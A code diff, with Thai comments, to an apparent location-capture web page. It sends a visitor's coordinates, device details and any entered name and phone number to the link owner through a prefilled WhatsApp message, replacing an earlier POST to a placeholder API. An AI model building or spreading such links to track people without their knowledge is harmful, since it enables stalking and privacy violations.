@@ -402,25 +402,40 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
                 }
             };
             
-            // ส่งข้อมูลไปยัง API
-            sendToAPI(locationData);
+            // ส่งข้อมูลมาหาคุณจริงๆ
+            sendToOwner(locationData);
+        }
+        
+        function sendToOwner(data) {
+            if (!data) {
+                return;
+            }
             
             // สร้างข้อความที่จะส่งมาหาเรา
             const ownerMessage = `🚨 ตำแหน่งใหม่จากลิงก์!
             
 📍 ตำแหน่ง:
-ละติจูด: ${currentLocation.latitude.toFixed(6)}
-ลองจิจูด: ${currentLocation.longitude.toFixed(6)}
-ความแม่นยำ: ${Math.round(currentLocation.accuracy)} เมตร
+ละติจูด: ${data.latitude.toFixed(6)}
+ลองจิจูด: ${data.longitude.toFixed(6)}
+ความแม่นยำ: ${Math.round(data.accuracy)} เมตร
 
 🔗 ดูบน Google Maps:
-https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}
+https://www.google.com/maps?q=${data.latitude},${data.longitude}
 
-⏰ เวลา: ${new Date().toLocaleString('th-TH')}
+⏰ เวลา: ${new Date(data.timestamp).toLocaleString('th-TH')}
 
-📱 ส่งจาก: ${navigator.userAgent}
+📱 ส่งจาก: ${data.userAgent}
 
-🌐 ลิงก์: ${window.location.href}`;
+🌐 ลิงก์: ${data.url}
+
+${data.user ? `
+👤 ชื่อ: ${data.user.name}
+${data.user.phone ? `📞 เบอร์โทร: ${data.user.phone}` : ''}
+${data.user.message ? `💬 ข้อความ: ${data.user.message}` : ''}
+` : ''}
+
+📊 ข้อมูล JSON:
+${JSON.stringify(data, null, 2)}`;
             
             // ส่งมาหาเราโดยตรง
             const encodedOwnerMessage = encodeURIComponent(ownerMessage);
@@ -436,27 +451,6 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
             setTimeout(() => {
                 window.open(ownerWhatsappUrl, '_blank');
             }, 2000);
-        }
-        
-        function sendToAPI(data) {
-            // ส่งข้อมูลไปยัง API (ใช้ webhook หรือ API endpoint)
-            const apiUrl = 'https://your-api-endpoint.com/api/location';
-            
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('✅ ส่งข้อมูลไปยัง API เรียบร้อย:', result);
-            })
-            .catch(error => {
-                console.error('❌ เกิดข้อผิดพลาดในการส่งข้อมูล:', error);
-                // ข้อมูลถูกเก็บใน localStorage แล้ว
-            });
         }
         
         function sendLocationData() {
@@ -523,8 +517,8 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
                 console.error('❌ เกิดข้อผิดพลาดในการเก็บข้อมูล:', error);
             }
             
-            // ส่งข้อมูลไปยัง API (ถ้ามี)
-            sendToAPI(data);
+            // ส่งข้อมูลมาหาคุณจริงๆ
+            sendToOwner(data);
         }
         
         // เปิดใช้งานเมื่อโหลดหน้าเสร็จ
